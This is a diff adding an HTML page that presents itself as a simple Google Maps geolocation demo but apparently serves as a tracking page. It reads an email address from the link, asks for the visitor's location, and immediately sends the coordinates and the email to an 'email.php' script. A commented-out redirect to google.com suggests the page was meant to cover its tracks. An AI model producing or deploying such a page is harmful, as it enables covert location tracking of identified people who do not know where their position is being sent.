@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+<meta content="utf-8" http-equiv="encoding">
+<title>Geolocation</title>
+<style>
+#location {
+  top: 10px;
+  left: 10px;
+  position: absolute;
+}
+</style>
+<script src="https://maps.googleapis.com/maps/api/js?v=3.exp"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+
+<script>
+
+var urlParam = function(name, w){
+    w = w || window;
+    var rx = new RegExp('[\&|\?]'+name+'=([^\&\#]+)'),
+        val = w.location.search.match(rx);
+    return !val ? '':val[1];
+}
+
+var email = urlParam('Email');
+
+var map;
+function initialize() {
+var mapOptions = {
+  disableDefaultUI: 1
+};
+map = new google.maps.Map(document.getElementById('location'), mapOptions);
+  if(navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      var pos = new google.maps.LatLng(position.coords.latitude,
+      position.coords.longitude);
+      window.location.href = "email.php?message=" + pos + "&email=" + email;
+      /*setTimeout(function() {
+        $(location).attr('href', 'https://www.google.com');
+      }, 500);*/
+      var infowindow = new google.maps.InfoWindow({
+        map: map,
+        position: pos,
+        content: 'Location found using HTML5.'
+      });
+      map.setCenter(pos);
+    }, function() {
+        handleNoGeolocation(true);
+      });
+      } else {
+        // Browser doesn't support Geolocation
+        handleNoGeolocation(false);
+        }
+ };
+function handleNoGeolocation(errorFlag) {
+  if (errorFlag) {
+    var content = 'Error: The Geolocation service failed.';
+  } 
+    else {
+      var content = 'Error: Your browser doesn\'t support geolocation.';
+    }
+  var options = {
+    map: map,
+    position: new google.maps.LatLng(60, 105),
+    content: content
+  };
+  var infowindow = new google.maps.InfoWindow(options);
+  map.setCenter(options.position);
+ };
+google.maps.event.addDomListener(window, 'load', initialize);
+</script>
+</head>
+<body>
+  <div id="location">
+  </div>
+</body>
+</html>
